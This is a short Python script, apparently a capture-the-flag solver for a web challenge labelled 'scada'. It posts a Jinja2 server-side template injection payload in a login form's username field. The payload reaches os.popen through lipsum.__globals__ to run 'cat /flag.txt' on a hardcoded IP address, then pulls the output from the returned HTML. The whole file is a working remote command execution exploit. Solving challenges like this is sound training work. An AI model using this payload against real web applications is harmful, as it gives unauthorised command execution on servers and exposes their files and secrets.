#!/usr/bin/env python3
# web/scada/solve.py
import re, sys, urllib.parse, urllib.request

URL = "http://193.136.164.147:23221/login"
CMD = "cat /flag.txt"
PAYLOAD = "{% print(lipsum.__globals__['os'].popen('" + CMD + "').read()) %}"

data = urllib.parse.urlencode({"username": PAYLOAD}).encode()
req = urllib.request.Request(URL, data=data, method="POST")
html = urllib.request.urlopen(req, timeout=15).read().decode()

m = re.search(r'name="username" placeholder="([^"]*)"', html, re.S)
print(m.group(1) if m else "[no placeholder found]", file=sys.stderr)